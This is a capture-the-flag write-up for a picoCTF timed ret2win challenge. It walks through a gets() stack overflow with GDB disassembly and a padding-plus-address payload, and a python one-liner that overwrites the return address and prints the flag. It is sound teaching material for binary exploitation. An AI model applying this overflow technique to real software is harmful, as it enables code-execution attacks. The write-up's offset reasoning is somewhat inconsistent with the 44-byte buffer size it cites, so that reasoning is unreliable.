# 120-Second Ret2win — Race Against the Clock

**Platform:** picoCTF  
**Technique:** ret2win / Buffer Overflow  
**Difficulty:** Easy-Medium  

## Challenge Description

A timed challenge. You have **120 seconds** to exploit a randomly selected binary from a bank of C files. Each binary has a `win()` function that prints the flag. The binary is compiled on the fly, and the source is provided. If you don't exploit it in time, the files are deleted, and you have to restart.

## Vulnerability

The program uses `gets()` to read into a fixed-size buffer, allowing a classic stack buffer overflow. The `win()` function is present in the binary — no need for ROP, libc, or leaks. Just find the offset and overwrite the return address.

## Exploitation

### Step 1: Read the Source

```bash
cat 3.c
```
The source reveals:

Buffer size: 44 bytes

win() function address: not directly given, but can be found

Step 2: Find the Offset
In GDB, disassemble vuln:

```text
(gdb) disas vuln
   0x08049281 <+0>:     endbr32 
   0x08049285 <+4>:     push   %ebp
   0x08049286 <+5>:     mov    %esp,%ebp
   0x08049288 <+7>:     push   %ebx
   0x08049289 <+8>:     sub    $0x34,%esp
   ...
   0x080492bf <+62>:    mov    -0x4(%ebp),%ebx
   0x080492c2 <+65>:    leave  
   0x080492c3 <+66>:    ret
```
Buffer starts at ebp-0x34 (52 bytes)

Saved EBP is 4 bytes → offset to return address = 52 + 4 = 56 bytes

Step 3: Find the Win Address
```bash
(gdb) disas win
   0x080491f6 <+0>:     endbr32 
   ...
Win address is 0x080491f6.
```

Step 4: Craft the Payload
```python
payload = b'A' * 56 + b'\xf6\x91\x04\x08'
```
56 bytes of padding to reach the return address

Win address packed in little-endian (32-bit)

Step 5: Send and Win
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 56 + b'\xf6\x91\x04\x08' + b'\n')" | ./3
```
Output:

```text
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{u_Us3d_pwNt00L5_a258f222}
```
